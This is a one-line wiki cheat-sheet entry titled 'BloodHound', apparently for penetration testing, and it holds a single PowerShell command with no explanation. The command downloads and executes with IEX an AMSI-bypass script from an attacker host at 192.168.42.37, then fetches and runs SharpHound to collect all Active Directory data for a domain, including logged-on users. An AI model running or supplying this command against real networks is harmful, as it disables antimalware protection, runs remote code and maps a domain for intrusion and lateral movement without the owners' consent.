---
title: "BloodHound"
date: 2025-10-03
draft: false
type: wiki
---

```powershell
$attacker="192.168.42.37";$domain="example.com";IEX(New-Object Net.Webclient).downloadString("http://$attacker/4msibyp455.ps1");IEX(New-Object Net.Webclient).downloadString("http://$attacker/SharpHound.ps1");Invoke-BloodHound -CollectionMethod All,GPOLocalGroup,LoggedOn -Domain $domain
```

-----------------------------
